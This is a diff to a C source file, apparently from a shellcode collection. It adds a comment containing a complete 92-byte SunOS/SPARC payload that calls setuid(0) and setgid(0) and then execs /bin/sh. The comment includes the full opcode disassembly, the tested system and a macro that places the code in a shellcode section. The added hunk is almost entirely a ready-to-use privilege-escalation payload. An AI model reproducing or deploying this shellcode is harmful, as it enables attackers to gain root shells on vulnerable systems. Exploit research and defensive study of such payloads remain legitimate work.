@@ -12,6 +12,42 @@
 
 #include "regs/state.h"
 
+/*
+ * SunOS (Solaris) / (sun4u / sparc32) setuid(0) + setgid(0) + execve("/bin/sh",
+ * {"/bin/sh", NULL}, NULL) 92 bytes shellcode
+ *
+ * Paulus Gandung Prakosa <gandung@galactic.demon.co.uk>
+ *
+ * Tested on: SunOS leviathan 5.6 Generic_105181-30 sun4u sparc SUNW.Ultra-1
+ *
+ * Disassembly of section .text:
+ *
+ * 00010074 <_start>:
+ * 10074: 90 10 20 01   mov  1, %o0
+ * 10078: 90 22 20 01   dec  %o0
+ * 1007c: 82 10 20 17   mov  0x17, %g1
+ * 10080: 91 d0 20 10   ta  0x10
+ * 10084: 90 10 20 01   mov  1, %o0
+ * 10088: 90 22 20 01   dec  %o0
+ * 1008c: 82 10 20 2e   mov  0x2e, %g1
+ * 10090: 91 d0 20 10   ta  0x10
+ * 10094: 94 10 20 01   mov  1, %o2
+ * 10098: 94 22 a0 01   dec  %o2
+ * 1009c: 11 0b cb d8   sethi  %hi(0x2f2f6000), %o0
+ * 100a0: 90 12 22 69   or  %o0, 0x269, %o0 ! 2f2f6269 <__bss_start+0x2f2d6199>
+ * 100a4: 13 1b 8b dc   sethi  %hi(0x6e2f7000), %o1
+ * 100a8: 92 12 63 68   or  %o1, 0x368, %o1 ! 6e2f7368 <__bss_start+0x6e2d7298>
+ * 100ac: d4 23 bf fc   st  %o2, [ %sp + -4 ]
+ * 100b0: d2 23 bf f8   st  %o1, [ %sp + -8 ]
+ * 100b4: d0 23 bf f4   st  %o0, [ %sp + -12 ]
+ * 100b8: 90 23 a0 0c   sub  %sp, 0xc, %o0
+ * 100bc: d4 23 bf f0   st  %o2, [ %sp + -16 ]
+ * 100c0: d0 23 bf ec   st  %o0, [ %sp + -20 ]
+ * 100c4: 92 23 a0 14   sub  %sp, 0x14, %o1
+ * 100c8: 82 10 20 3b   mov  0x3b, %g1
+ * 100cc: 91 d0 20 10   ta  0x10
+ */
+
 #ifndef __sect_shellcode
 #define __sect_shellcode __attribute__((section(".sect.shellcode")))
 #endif
